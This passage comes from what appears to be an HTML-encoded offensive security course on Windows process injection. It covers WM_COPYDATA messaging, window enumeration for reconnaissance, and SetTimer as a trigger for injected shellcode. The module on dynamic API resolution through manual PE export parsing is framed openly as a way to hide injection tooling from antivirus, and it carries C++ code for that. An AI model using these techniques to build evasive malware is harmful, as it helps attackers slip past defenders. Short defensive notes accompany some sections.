Notepad&quot;; // Adjust as needed\n    HWND hWndTarget = FindTargetWindow(targetTitle);\n\n    if (!hWndTarget) {\n        std::cerr &lt;&lt; &quot;[-] Target window not found.&quot; &lt;&lt; std::endl;\n        return 1;\n    }\n\n    std::cout &lt;&lt; &quot;[+] Found target window handle: &quot; &lt;&lt; hWndTarget &lt;&lt; std::endl;\n\n    // 2. Prepare the data to send\n    std::string dataToSend = &quot;Hello from Injector!&quot;;\n    // We need to send the data as a null-terminated string for simplicity\n    // Add 1 for the null terminator\n    size_t dataSize = dataToSend.length() + 1;\n\n    // 3. Populate the COPYDATASTRUCT\n    COPYDATASTRUCT cds;\n    cds.dwData = 0x12345678; // User-defined data (can be anything)\n    cds.cbData = dataSize;   // Size of the data buffer\n    cds.lpData = dataToSend.data(); // Pointer to the data in *our* process\n\n    std::cout &lt;&lt; &quot;[+] Sending WM_COPYDATA message...&quot; &lt;&lt; std::endl;\n\n    // 4. Send the WM_COPYDATA message\n    // SendMessage returns LRESULT, which is often interpreted by the recipient\n    // For WM_COPYDATA, a non-zero return typically indicates success\n    LRESULT result = SendMessage(hWndTarget,\n                                 WM_COPYDATA,\n                                 (WPARAM)GetConsoleWindow(), // Optional: sender window handle\n                                 (LPARAM)&amp;cds); // Pointer to the COPYDATASTRUCT\n\n    if (result == 0) {\n        // Recipient returned 0, might indicate failure or specific handling\n        std::cerr &lt;&lt; &quot;[-] SendMessage returned 0. Target might not handle WM_COPYDATA or indicated failure.&quot; &lt;&lt; std::endl;\n    } else {\n        std::cout &lt;&lt; &quot;[+] SendMessage successful. Result: &quot; &lt;&lt; result &lt;&lt; std::endl;\n    }\n\n    std::cout &lt;&lt; &quot;[+] Data sent: \\&quot;&quot; &lt;&lt; dataToSend &lt;&lt; &quot;\\&quot;&quot; &lt;&lt; std::endl;\n\n    return 0;\n}\n</code></pre>\n<p><strong>Implementation Steps (Recipient Side - Handling Data):</strong></p>\n<p>The target process needs a <code>WndProc</code> that handles the <code>WM_COPYDATA</code> message.</p>\n<ol>\n<li>Check if the received message (<code>uMsg</code>) is <code>WM_COPYDATA</code>.</li>\n<li>If it is, cast the <code>lParam</code> to <code>PCOPYDATASTRUCT</code>.</li>\n<li>Access the data using <code>pcds-&gt;lpData</code> and <code>pcds-&gt;cbData</code>. Remember <code>pcds-&gt;lpData</code> points to memory in the <em>sender&#39;s</em> process, but the OS makes it accessible temporarily.</li>\n<li>Process the data.</li>\n<li>Return a non-zero value to indicate successful processing (or 0 for failure, depending on convention).</li>\n</ol>\n<p><strong>Code Example (Recipient WndProc Snippet):</strong></p>\n<pre><code class=\"language-cpp\">// This code would be inside the target process&#39;s WndProc function\nLRESULT CALLBACK TargetWndProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {\n    switch (uMsg) {\n        case WM_COPYDATA:\n        {\n            PCOPYDATASTRUCT pcds = (PCOPYDATASTRUCT)lParam;\n            std::cout &lt;&lt; &quot;[+] Received WM_COPYDATA message!&quot; &lt;&lt; std::endl;\n            std::cout &lt;&lt; &quot;    dwData: &quot; &lt;&lt; std::hex &lt;&lt; pcds-&gt;dwData &lt;&lt; std::dec &lt;&lt; std::endl;\n            std::cout &lt;&lt; &quot;    cbData: &quot; &lt;&lt; pcds-&gt;cbData &lt;&lt; &quot; bytes&quot; &lt;&lt; std::endl;\n\n            // Access the data. pcds-&gt;lpData points to sender&#39;s memory,\n            // temporarily mapped into our address space.\n            if (pcds-&gt;lpData != NULL &amp;&amp; pcds-&gt;cbData &gt; 0) {\n                // Treat as a string (assuming null termination)\n                std::string receivedData(static_cast&lt;const char*&gt;(pcds-&gt;lpData), pcds-&gt;cbData);\n                std::cout &lt;&lt; &quot;    lpData: \\&quot;&quot; &lt;&lt; receivedData &lt;&lt; &quot;\\&quot;&quot; &lt;&lt; std::endl;\n\n                // *** POTENTIAL UNCONVENTIONAL USE CASE ***\n                // If dwData was a command ID and lpData was parameters,\n                // or if the application&#39;s logic interpreted lpData in a specific way\n                // (e.g., as a path to load, a command string to execute via system()),\n                // this could trigger actions within the target process.\n                // Direct execution of lpData as code is NOT typical or safe here.\n\n            } else {\n                 std::cout &lt;&lt; &quot;    lpData is NULL or cbData is 0.&quot; &lt;&lt; std::endl;\n            }\n\n            // Return non-zero to indicate successful handling\n            return TRUE; // Or any non-zero value\n        }\n        // ... other message handlers ...\n        case WM_DESTROY:\n            PostQuitMessage(0);\n            break;\n        default:\n            return DefWindowProc(hWnd, uMsg, wParam, lParam);\n    }\n    return 0;\n}\n</code></pre>\n<p><strong>Defensive Considerations:</strong></p>\n<ul>\n<li>Monitor <code>SendMessage</code> and <code>PostMessage</code> calls, especially <code>WM_COPYDATA</code>, originating from unusual processes or targeting critical system processes.</li>\n<li>Analyze the content of <code>COPYDATASTRUCT</code> being passed.</li>\n<li>Hook <code>WndProc</code> in critical processes to log or block suspicious messages.</li>\n</ul>\n<hr>\n<h3>5.2 Leveraging Desktop and Window Enumeration</h3>\n<p><strong>Concept:</strong> Windows provides functions like <code>EnumWindows</code>, <code>EnumChildWindows</code>, <code>EnumDesktops</code>, <code>EnumDesktopWindows</code> to enumerate windows or desktops. These functions take a callback function pointer that the OS invokes for each enumerated item.</p>\n<p><strong>How it Works:</strong></p>\n<ul>\n<li><code>EnumWindows(EnumWindowsProc, lParam)</code>: Enumerates all top-level windows on the screen. Calls <code>EnumWindowsProc</code> for each.</li>\n<li><code>EnumChildWindows(hWndParent, EnumChildProc, lParam)</code>: Enumerates child windows of a given parent window. Calls <code>EnumChildProc</code> for each.</li>\n<li><code>EnumDesktops(HWINSTA, EnumDesktopsProc, lParam)</code>: Enumerates desktops for a given window station. Calls <code>EnumDesktopsProc</code> for each.</li>\n<li><code>EnumDesktopWindows(HDESK, EnumDesktopWindowsProc, lParam)</code>: Enumerates top-level windows on a specific desktop. Calls <code>EnumDesktopWindowsProc</code> for each.</li>\n</ul>\n<p><strong>Why is this relevant to &quot;Execution Vectors&quot;?</strong></p>\n<ul>\n<li><strong>Primary Use (Offensive): Reconnaissance.</strong> These functions are invaluable for finding target window handles (<code>HWND</code>) and associated process IDs (<code>PID</code>). Once you have a target <code>HWND</code> and <code>PID</code>, you can use techniques from <em>other</em> modules (like finding threads, allocating memory, sending <code>WM_COPYDATA</code>, etc.).</li>\n<li><strong>Potential Indirect Use (Less Common):</strong> If a target application <em>itself</em> calls one of these enumeration functions and the <em>callback function within the target process</em> has a vulnerability (e.g., buffer overflow when processing window titles, use-after-free, etc.), then you <em>might</em> be able to trigger that vulnerability. However, this is an application-specific exploit, not a general injection method via the enumeration process itself.</li>\n<li><strong>Important Clarification:</strong> The callback functions (<code>EnumWindowsProc</code>, etc.) are executed by the <em>calling thread</em> in the <em>calling process</em>. They do <em>not</em> automatically run code in the target process you are enumerating. You are enumerating <em>information</em> about other processes&#39; windows, not injecting code <em>into</em> them via the callback mechanism itself.</li>\n</ul>\n<p><strong>Implementation Steps (Enumeration):</strong></p>\n<ol>\n<li>Define a callback function with the correct signature (<code>BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam)</code> for <code>EnumWindows</code>).</li>\n<li>Inside the callback, retrieve information about the window (<code>hwnd</code>) like its title (<code>GetWindowText</code>), class name (<code>GetClassName</code>), thread ID (<code>GetWindowThreadProcessId</code>).</li>\n<li>Optionally, use <code>lParam</code> to pass state or data into the callback (like a list to store results or a target criteria).</li>\n<li>Call the enumeration function (<code>EnumWindows</code>, etc.) with your callback and <code>lParam</code>.</li>\n<li>The callback should return <code>TRUE</code> to continue enumeration or <code>FALSE</code> to stop.</li>\n</ol>\n<p><strong>Code Example (Enumerating Top-Level Windows):</strong></p>\n<pre><code class=\"language-cpp\">#include &lt;windows.h&gt;\n#include &lt;iostream&gt;\n#include &lt;vector&gt;\n\nstruct WindowInfo {\n    HWND hwnd;\n    DWORD pid;\n    DWORD tid;\n    std::wstring title;\n};\n\n// Callback function for EnumWindows\nBOOL CALLBACK EnumWindowsCallback(HWND hwnd, LPARAM lParam) {\n    // Retrieve the vector of WindowInfo objects passed via lParam\n    std::vector&lt;WindowInfo&gt;* windowList = reinterpret_cast&lt;std::vector&lt;WindowInfo&gt;*&gt;(lParam);\n\n    // Get Process and Thread ID\n    DWORD pid = 0;\n    DWORD tid = GetWindowThreadProcessId(hwnd, &amp;pid);\n\n    // Get Window Title\n    wchar_t windowTitle[256];\n    int titleLength = GetWindowTextW(hwnd, windowTitle, sizeof(windowTitle) / sizeof(windowTitle[0]));\n    std::wstring title = (titleLength &gt; 0) ? windowTitle : L&quot;&quot;;\n\n    // Filter criteria (optional, e.g., only visible windows with titles)\n    if (IsWindowVisible(hwnd) &amp;&amp; titleLength &gt; 0) {\n        windowList-&gt;push_back({hwnd, pid, tid, title});\n    }\n\n    return TRUE; // Continue enumeration\n}\n\nint main() {\n    std::cout &lt;&lt; &quot;[+] Enumerating top-level windows...&quot; &lt;&lt; std::endl;\n\n    std::vector&lt;WindowInfo&gt; windows;\n\n    // Call EnumWindows with our callback and pass the vector address\n    if (EnumWindows(EnumWindowsCallback, reinterpret_cast&lt;LPARAM&gt;(&amp;windows))) {\n        std::cout &lt;&lt; &quot;[+] Enumeration complete.&quot; &lt;&lt; std::endl;\n        std::cout &lt;&lt; &quot;Found &quot; &lt;&lt; windows.size() &lt;&lt; &quot; visible windows with titles:&quot; &lt;&lt; std::endl;\n\n        for (const auto&amp; win : windows) {\n            std::wcout &lt;&lt; L&quot;  HWND: &quot; &lt;&lt; win.hwnd\n                       &lt;&lt; L&quot;, PID: &quot; &lt;&lt; win.pid\n                       &lt;&lt; L&quot;, TID: &quot; &lt;&lt; win.tid\n                       &lt;&lt; L&quot;, Title: \\&quot;&quot; &lt;&lt; win.title &lt;&lt; L&quot;\\&quot;&quot; &lt;&lt; std::endl;\n        }\n    } else {\n        std::cerr &lt;&lt; &quot;[-] EnumWindows failed. Error: &quot; &lt;&lt; GetLastError() &lt;&lt; std::endl;\n    }\n\n    return 0;\n}\n</code></pre>\n<p><strong>Defensive Considerations:</strong></p>\n<ul>\n<li>Monitor calls to enumeration functions from suspicious processes.</li>\n<li>Analyze the behavior of processes that perform extensive enumeration ‚Äì this is often a reconnaissance step for attackers.</li>\n<li>Ensure your own application&#39;s enumeration callbacks are robust and don&#39;t have vulnerabilities if they process data from external sources (less common for standard window properties, but relevant if enumerating custom objects).</li>\n</ul>\n<hr>\n<h3>5.3 Abusing Callbacks and Timers (<code>SetTimer</code>)</h3>\n<p><strong>Concept:</strong> Several Windows APIs allow you to register a callback function to be executed later. Examples include APCs (which we covered), timer callbacks (<code>TIMERPROC</code>), and callbacks for asynchronous I/O, thread pools, etc. While APCs are a direct execution method, others like <code>SetTimer</code> can <em>trigger</em> execution of code you&#39;ve already placed in the target process.</p>\n<p><strong>How <code>SetTimer</code> Works:</strong></p>\n<ol>\n<li><code>SetTimer(hWnd, nIDEvent, uElapse, lpTimerFunc)</code>: Creates a timer.<ul>\n<li><code>hWnd</code>: Handle of the window associated with the timer. Can be <code>NULL</code> if the timer is associated with a thread instead (requires a message loop).</li>\n<li><code>nIDEvent</code>: A timer ID.</li>\n<li><code>uElapse</code>: The timeout value in milliseconds.</li>\n<li><code>lpTimerFunc</code>: An optional pointer to a <code>TIMERPROC</code> callback function. If <code>NULL</code>, the system posts a <code>WM_TIMER</code> message to the window/thread&#39;s message queue. If non-<code>NULL</code>, the <code>TIMERPROC</code> is called directly by the system when the timer expires.</li>\n</ul>\n</li>\n<li><strong>Requirement:</strong> The thread that calls <code>SetTimer</code> (or the thread owning the window specified by <code>hWnd</code>) <em>must</em> have a message loop that dispatches messages. Timer messages/callbacks are processed within this message loop.</li>\n<li><strong><code>TIMERPROC</code>:</strong> The callback function signature is <code>VOID CALLBACK TimerProc(HWND hwnd, UINT uMsg, UINT_PTR idEvent, DWORD dwTime)</code>. This function is called by the system <em>in the context of the thread that set the timer</em> when the timer expires.</li>\n</ol>\n<p><strong>Why is this an &quot;Unconventional&quot; Execution Vector?</strong></p>\n<ul>\n<li>It&#39;s not a method to <em>get</em> code into the target process initially (unlike <code>WriteProcessMemory</code> or mapping sections).</li>\n<li>It&#39;s an <em>execution trigger</em> for code that is <em>already</em> in the target process&#39;s memory.</li>\n<li>To use <code>SetTimer</code> remotely for arbitrary code execution, you would typically need to:<ol>\n<li>Use a method from previous modules (<code>VirtualAllocEx</code>, <code>WriteProcessMemory</code>, etc.) to allocate executable memory in the target process and write your shellcode or <code>TIMERPROC</code> implementation into it.</li>\n<li>Obtain a handle to a thread in the target process that <em>has a message loop</em>. (Enumeration techniques or checking thread state might help identify suitable threads, though reliably checking for a message loop remotely is tricky without already having code in the process).</li>\n<li>Use a method like <code>QueueUserAPC</code> or <code>CreateRemoteThreadEx</code> to execute code in the target thread that <em>calls</em> <code>SetTimer</code> with a pointer to your injected <code>TIMERPROC</code> code.</li>\n</ol>\n</li>\n</ul>\n<p><strong>Implementation Steps (Remote Timer Execution - Conceptual):</strong></p>\n<ol>\n<li>(Prerequisite from Module 3): Get a handle to the target process (<code>OpenProcess</code>).</li>\n<li>(Prerequisite from Module 3): Allocate executable memory in the target process (<code>NtAllocateVirtualMemory</code> or <code>VirtualAllocEx</code>).</li>\n<li>(Prerequisite from Module 3): Write your <code>TIMERPROC</code> shellcode/function into the allocated memory (<code>NtWriteVirtualMemory</code> or <code>WriteProcessMemory</code>).</li>\n<li>(Prerequisite from Module 1): Find a suitable target thread (one with a message loop). Get a handle to it (<code>OpenThread</code>).</li>\n<li>(Prerequisite from Module 2): Prepare a small APC payload or use <code>NtCreateThreadEx</code> to run code in the target thread. This code will call <code>SetTimer</code>.</li>\n<li>The code running in the target thread executes <code>SetTimer(NULL, timerId, delay, pointerToInjectedTimerProc)</code>.</li>\n<li>After <code>delay</code> milliseconds, if the target thread is processing messages, your injected <code>TIMERPROC</code> is called.</li>\n</ol>\n<p><strong>Code Example (Local SetTimer):</strong></p>\n<pre><code class=\"language-cpp\">#include &lt;windows.h&gt;\n#include &lt;iostream&gt;\n\n// Global flag to indicate if the timer fired\nbool timerFired = false;\n\n// The TIMERPROC callback function\nVOID CALLBACK MyTimerProc(HWND hwnd, UINT uMsg, UINT_PTR idEvent, DWORD dwTime) {\n    // This function executes in the context of the thread that set the timer\n    std::cout &lt;&lt; &quot;[+] Timer fired in thread ID: &quot; &lt;&lt; GetCurrentThreadId() &lt;&lt; std::endl;\n    std::cout &lt;&lt; &quot;    idEvent: &quot; &lt;&lt; idEvent &lt;&lt; std::endl;\n    // In a real scenario, your shellcode/payload would go here\n    MessageBoxW(NULL, L&quot;Timer Payload Executed!&quot;, L&quot;Timer Fire!&quot;, MB_OK);\n    timerFired = true; // Signal that the timer fired\n}\n\nint main() {\n    std::cout &lt;&lt; &quot;[+] Setting up a timer...&quot; &lt;&lt; std::endl;\n\n    // Get the handle of the current console window (it has a message loop)\n    HWND hWndConsole = GetConsoleWindow();\n    if (hWndConsole == NULL) {\n        std::cerr &lt;&lt; &quot;[-] Failed to get console window handle.&quot; &lt;&lt; std::endl;\n        return 1;\n    }\n\n    UINT_PTR timerId = 1; // A unique ID for this timer\n    UINT delay = 2000;   // 2000 milliseconds = 2 seconds\n\n    // Set the timer. The callback MyTimerProc will be called after 2 seconds.\n    UINT_PTR resultTimerId = SetTimer(hWndConsole, timerId, delay, MyTimerProc);\n\n    if (resultTimerId == 0) {\n        std::cerr &lt;&lt; &quot;[-] Failed to set timer. Error: &quot; &lt;&lt; Get\n</code></pre>\n\n                </div>\n             </div>\n         ",
    "module-6": "\n             <div class=\"card main-content-card\"> <!-- Added main-content-card class -->\n                <h1>Module 6: module_6</h1> <!-- Use module title here -->\n                <div class=\"markdown-content\">\n                    <p>Alright team, buckle up! We&#39;ve laid the groundwork by understanding process internals, threads, and different execution contexts. We&#39;ve even dipped our toes into APCs, Native API, and Fibers. But let&#39;s be honest, a tool that statically imports <code>VirtualAllocEx</code>, <code>CreateRemoteThread</code>, or even <code>NtCreateThreadEx</code> is screaming &quot;look at me!&quot; to security products.</p>\n<p>In this module, we&#39;re leveling up our stealth game significantly. We&#39;re going to tackle the fundamental problem of static imports and learn how to make our tools resolve the necessary Windows API functions <em>dynamically</em> at runtime. This means analyzing the Portable Executable (PE) format ourselves, just like the Windows loader does, to find the addresses of the functions we need. This is a cornerstone technique in sophisticated malware and red team tools, and it draws heavily from the kind of low-level PE manipulation concepts you&#39;d find discussed in places like <code>zhasslan.txt</code>.</p>\n<p>Let&#39;s dive deep into the guts of the PE format and build our own dynamic resolver!</p>\n<hr>\n<h2>Module 6: Stealth Operations - Dynamic API Resolution and Export Tables</h2>\n<p><strong>Module Objective:</strong> Understand the necessity of hiding API calls from static analysis and implement the core logic to dynamically resolve required API function addresses at runtime by parsing the Portable Execable (PE) format&#39;s Export Directory.</p>\n<p><strong>Estimated Time:</strong> 4-6 hours (including coding and debugging)</p>\n<h3>6.1 The Problem with Static Imports (IAT)</h3>\n<p>Okay, let&#39;s start with <em>why</em> we&#39;re doing this. When you write a typical C/C++ program that calls Windows API functions like <code>MessageBoxA</code>, <code>CreateFileA</code>, or <code>VirtualAlloc</code>, the compiler and linker work together to create an Import Address Table (IAT) in your executable&#39;s PE header.</p>\n<ul>\n<li><strong>What is the IAT?</strong> It&#39;s essentially a list of all the functions your program intends to import from external DLLs (like <code>kernel32.dll</code>, <code>user32.dll</code>).</li>\n<li><strong>How does it work?</strong> The IAT contains entries for each imported function. Initially, these entries might hold hints (like the function name or ordinal). When the Windows loader maps your executable into memory, it finds the required DLLs, resolves the actual memory addresses of those functions within the loaded DLLs, and patches the IAT entries in your executable with those addresses. Your code then calls the function indirectly via the IAT entry.</li>\n<li><strong>The Security Problem:</strong> Static analysis tools, antivirus engines, and even simple command-line utilities like <code>dumpbin</code> can easily parse your executable&#39;s PE header and read the IAT. They can see exactly which functions from which DLLs your program <em>intends</em> to use <em>before</em> it even runs. If your program imports <code>OpenProcess</code>, <code>VirtualAllocEx</code>, <code>WriteProcessMemory</code>, and <code>CreateRemoteThread</code>, that&#39;s a pretty strong indicator that it might be doing process injection. This provides a static signature that&#39;s easy for defenders to detect.</li>\n</ul>\n<p>Our goal is to eliminate or minimize this static footprint. We want our executable to look like it imports very little (maybe just a few basic functions needed to <em>start</em> our custom loader), and then have our loader code dynamically find and call all the sensitive APIs at runtime.</p>\n<h3>6.2 How the Windows Loader Resolves Imports (A Quick Look)</h3>\n<p>To understand how to <em>manually</em> resolve APIs, it helps to know how the OS loader does it. When the loader loads an executable or a DLL:</p>\n<ol>\n<li>It reads the PE header, specifically the Import Directory.</li>\n<li>For each required DLL listed in the Import Directory, it loads that DLL into memory.</li>\n<li>For each function listed in the IAT for that DLL:<ul>\n<li>It looks up the function&#39;s address within the <em>Export Directory</em> of the loaded DLL.</li>\n<li>It writes the resolved address into the corresponding IAT entry of the importing module.</li>\n</ul>\n</li>\n</ol>\n<p>Our dynamic resolution will mimic step 3, but <em>our code</em> will do the lookup by parsing the target DLL&#39;s Export Directory, rather than the OS loader doing it based on our IAT.</p>\n<h3>6.3 Diving into the PE Format: Focus on the Export Directory</h3>\n<p>The Portable Executable (PE) format is the structure of executables (<code>.exe</code>), DLLs (<code>.dll</code>), and object files (<code>.obj</code>) on Windows. While complex, we only need to understand specific parts to implement dynamic API resolution.</p>\n<p>We need to navigate a series of structures starting from the base address of a loaded module (like <code>kernel32.dll</code>).</p>\n<ol>\n<li><p><strong>DOS Header (<code>IMAGE_DOS_HEADER</code>)</strong>: The very beginning of the file/module. It&#39;s a legacy structure from MS-DOS days.</p>\n<ul>\n<li>We need the <code>e_lfanew</code> field. This is a <code>LONG</code> (32-bit offset) that points to the start of the <code>IMAGE_NT_HEADERS</code>. It&#39;s an <strong>RVA</strong> (Relative Virtual Address) from the base of the module.</li>\n</ul>\n</li>\n<li><p><strong>NT Headers (<code>IMAGE_NT_HEADERS</code>)</strong>: This structure contains core information about the PE file.</p>\n<ul>\n<li>It starts with a <code>Signature</code> (<code>DWORD</code>) which should be <code>IMAGE_NT_SIGNATURE</code> (0x00004550, or &quot;PE\\0\\0&quot;). Always check this for validation!</li>\n<li>It contains an <code>IMAGE_FILE_HEADER</code> (which isn&#39;t critical for us here).</li>\n<li>Crucially, it contains the <code>IMAGE_OPTIONAL_HEADER</code>.</li>\n</ul>\n</li>\n<li><p><strong>Optional Header (<code>IMAGE_OPTIONAL_HEADER</code>)</strong>: Despite the name, this header is essential for executables and DLLs. It contains vital information about the layout and properties of the image in memory.</p>\n<ul>\n<li>We need the <code>DataDirectory</code> field. This is an array of <code>IMAGE_DATA_DIRECTORY</code> structures. Each entry points to a different important data structure (like the Import Directory, Export Directory, Resource Directory, etc.) and gives its size.</li>\n<li>The <code>DataDirectory</code> array has a fixed number of entries, defined by <code>IMAGE_NUMBEROF_DIRECTORY_ENTRIES</code> (usually 16). The <em>first</em> entry (index 0) is the <strong>Export Directory</strong>.</li>\n</ul>\n</li>\n<li><p><strong>Data Directory (<code>IMAGE_DATA_DIRECTORY</code>)</strong>: Each entry in the <code>DataDirectory</code> array has two fields:</p>\n<ul>\n<li><code>VirtualAddress</code>: The <strong>RVA</strong> of the data structure (e.g., the Export Directory Table).</li>\n<li><code>Size</code>: The size of the data structure.</li>\n</ul>\n</li>\n<li><p><strong>Export Directory Table (<code>IMAGE_EXPORT_DIRECTORY</code>)</strong>: This is the structure we finally reach by following the RVA from the first <code>IMAGE_DATA_DIRECTORY</code> entry. It contains the information needed to find exported functions.</p>\n<ul>\n<li><code>Base</code>: The starting ordinal number for the functions exported by ordinal.</li>\n<li><code>NumberOfFunctions</code>: Total number of exported functions.</li>\n<li><code>NumberOfNames</code>: Number of exported functions that have names (i.e., listed in the <code>AddressOfNames</code> array). Functions can be exported <em>only</em> by ordinal, or by both name and ordinal.</li>\n<li><code>AddressOfFunctions</code>: An <strong>RVA</strong> to an array of RVAs. This is the <strong>Export Address Table (EAT)</strong>. Each entry in this array is the RVA of an exported function&#39;s entry point. The index into this array is <code>Ordinal - Base</code>.</li>\n<li><code>AddressOfNames</code>: An <strong>RVA</strong> to an array of RVAs. Each entry in this array is the RVA of a null-terminated ASCII string containing the name of an exported function.</li>\n<li><code>AddressOfNameOrdinals</code>: An <strong>RVA</strong> to an array of <code>WORD</code>s. This array maps the index from the <code>AddressOfNames</code> array to the corresponding ordinal number of the function. If a function is the <code>i</code>-th name in the <code>AddressOfNames</code> array, its ordinal is <code>AddressOfNameOrdinals[i]</code>.</li>\n</ul>\n</li>\n</ol>\n<p><strong>Putting it Together: The Lookup Process</strong></p>\n<p>To find the address of a function by name (e.g., &quot;CreateProcessA&quot;) in a loaded module (e.g., <code>kernel32.dll</code>) at address <code>hModule</code>:</p>\n<ol>\n<li>Calculate the address of the DOS Header: <code>dosHeader = (IMAGE_DOS_HEADER*)hModule</code>.</li>\n<li>Validate the DOS Header signature (<code>dosHeader-&gt;e_magic == IMAGE_DOS_SIGNATURE</code>).</li>\n<li>Calculate the address of the NT Headers: <code>ntHeaders = (IMAGE_NT_HEADERS*)((BYTE*)hModule + dosHeader-&gt;e_lfanew)</code>.</li>\n<li>Validate the NT Headers signature (<code>ntHeaders-&gt;Signature == IMAGE_NT_SIGNATURE</code>).</li>\n<li>Get the address of the Optional Header: <code>optionalHeader = &amp;ntHeaders-&gt;OptionalHeader</code>.</li>\n<li>Get the address of the Data Directories array: <code>dataDir = optionalHeader-&gt;DataDirectory</code>.</li>\n<li>Check if the Export Directory entry is valid (i.e., <code>dataDir[IMAGE_DIRECTORY_ENTRY_EXPORT].Size &gt; 0</code>).</li>\n<li>Calculate the address of the Export Directory Table: <code>exportDir = (IMAGE_EXPORT_DIRECTORY*)((BYTE*)hModule + dataDir[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress)</code>.</li>\n<li>Calculate the base addresses of the three key arrays by adding their RVAs (from <code>exportDir</code>) to the module base address (<code>hModule</code>):<ul>\n<li><code>addressOfFunctions = (DWORD*)((BYTE*)hModule + exportDir-&gt;AddressOfFunctions)</code></li>\n<li><code>addressOfNames = (DWORD*)((BYTE*)hModule + exportDir-&gt;AddressOfNames)</code></li>\n<li><code>addressOfNameOrdinals = (WORD*)((BYTE*)hModule + exportDir-&gt;AddressOfNameOrdinals)</code></li>\n</ul>\n</li>\n<li>Iterate through the <code>AddressOfNames</code> array from index 0 to <code>exportDir-&gt;NumberOfNames - 1</code>.</li>\n<li>For each index <code>i</code>:<ul>\n<li>Get the RVA of the function name string: <code>nameRVA = addressOfNames[i]</code>.</li>\n<li>Calculate the address of the function name string: <code>functionName = (char*)((BYTE*)hModule + nameRVA)</code>.</li>\n<li>Compare <code>functionName</code> with the target function name string (e.g., &quot;CreateProcessA&quot;) using <code>strcmp</code>.</li>\n</ul>\n</li>\n<li>If <code>strcmp</code> returns 0 (names match):<ul>\n<li>Get the function&#39;s ordinal from the <code>AddressOfNameOrdinals</code> array using the current index <code>i</code>: <code>ordinal = addressOfNameOrdinals[i]</code>.</li>\n<li>Get the function&#39;s RVA from the <code>AddressOfFunctions</code> array using the ordinal: <code>functionRVA = addressOfFunctions[ordinal]</code>.</li>\n<li>Calculate the function&#39;s virtual address (the actual memory address where the code starts): <code>functionAddress = (void*)((BYTE*)hModule + functionRVA)</code>.</li>\n<li>Return <code>functionAddress</code>.</li>\n</ul>\n</li>\n<li>If the loop finishes without finding the name, the function is not exported by name (or doesn&#39;t exist), return <code>NULL</code>.</li>\n</ol>\n<p><strong>Handling Ordinal Exports and Forwarders:</strong></p>\n<ul>\n<li><strong>Ordinal Exports:</strong> Some functions are <em>only</em> exported by ordinal, not by name. Our current algorithm (which iterates <code>AddressOfNames</code>) won&#39;t find these. To find functions by ordinal, you&#39;d calculate the index into <code>AddressOfFunctions</code> as <code>Ordinal - Base</code> and retrieve the RVA directly. For this module&#39;s project, finding by name is sufficient, but be aware of ordinal-only exports.</li>\n<li><strong>Forwarders:</strong> An export can sometimes be a &quot;forwarder&quot; string (e.g., &quot;NtCreateThreadEx&quot; in <code>kernel32.dll</code> is forwarded to &quot;NtCreateThreadEx&quot; in <code>ntdll.dll</code>). The RVA in the EAT points to a string like <code>&quot;ntdll.NtCreateThreadEx&quot;</code> instead of code. Our simple RVA-to-VA conversion will yield a pointer to this string. A robust resolver needs to detect if an RVA falls within the Export Directory itself and, if so, parse the forwarder string, load the target DLL (if not already loaded), and resolve the function in the target DLL. This adds complexity. For this module, we will primarily focus on resolving non-forwarded functions or assume we handle forwarders by resolving the <em>target</em> function in the <em>target</em> DLL manually (e.g., resolve <code>NtCreateThreadEx</code> directly from <code>ntdll.dll</code> instead of <code>kernel32.dll</code>).</li>\n</ul>\n<h3>6.4 Implementing the Manual PE Parser and Resolver</h3>\n<p>Let&#39;s translate the algorithm into C++ code. We&#39;ll need Windows headers for the PE structure definitions.</p>\n<pre><code class=\"language-c++\">#include &lt;windows.h&gt;\n#include &lt;winternl.h&gt; // For PE structure definitions (like IMAGE_NT_HEADERS)\n#include &lt;stdio.h&gt;    // For printf\n#include &lt;string.h&gt;   // For strcmp\n\n// Define necessary PE structures if winternl.h isn&#39;t available or sufficient\n// (winternl.h is usually sufficient on modern MSVC)\n#ifndef IMAGE_NT_SIGNATURE\n#define IMAGE_NT_SIGNATURE    0x00004550  // PE00\n#endif\n\n#ifndef IMAGE_DOS_SIGNATURE\n#define IMAGE_DOS_SIGNATURE   0x5A4D      // MZ\n#endif\n\n// IMAGE_DIRECTORY_ENTRY_EXPORT is typically defined as 0\n\n/*\n * ManualGetProcAddress: Dynamically resolves the address of an exported function\n *                        within a loaded module by manually parsing its PE header.\n *\n * hModule: Base address of the loaded module (e.g., HMODULE from GetModuleHandle).\n * lpProcName: Name of the function to resolve (ASCII string).\n *\n * Returns: The address of the function if found, NULL otherwise.\n */\nvoid* ManualGetProcAddress(HMODULE hModule, const char* lpProcName) {\n    // Validate module handle\n    if (!hModule) {\n        fprintf(stderr, &quot;Error: Invalid module handle.\\n&quot;);\n        return NULL;\n    }\n\n    // 1. Get the DOS header\n    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;\n\n    // 2. Validate DOS header signature\n    if (dosHeader-&gt;e_magic != IMAGE_DOS_SIGNATURE) {\n        fprintf(stderr, &quot;Error: Invalid DOS signature.\\n&quot;);\n        return NULL;\n    }\n\n    // 3. Get the NT headers using e_lfanew\n    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + dosHeader-&gt;e_lfanew);\n\n    // 4. Validate NT headers signature\n    if (ntHeaders-&gt;Signature != IMAGE_NT_SIGNATURE) {\n        fprintf(stderr, &quot;Error: Invalid NT signature.\\n&quot;);\n        return NULL;\n    }\n\n    // 5. Get the Optional Header (contains Data Directories)\n    // 6. Get the Data Directories array from the Optional Header\n    PIMAGE_DATA_DIRECTORY dataDirectory = ntHeaders-&gt;OptionalHeader.DataDirectory;\n\n    // 7. Check if the Export Directory exists (entry 0)\n    if (dataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size == 0) {\n        fprintf(stderr, &quot;Error: Module has no export directory.\\n&quot;);\n        return NULL;\n    }\n\n    // 8. Calculate the address of the Export Directory Table\n    PIMAGE_EXPORT_DIRECTORY exportDirectory = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hModule + dataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);\n\n    // 9. Calculate the base addresses of the three key arrays\n    DWORD* addressOfFunctions = (DWORD*)((BYTE*)hModule + exportDirectory-&gt;AddressOfFunctions);\n    DWORD* addressOfNames = (DWORD*)((BYTE*)hModule + exportDirectory-&gt;AddressOfNames);\n    WORD* addressOfNameOrdinals = 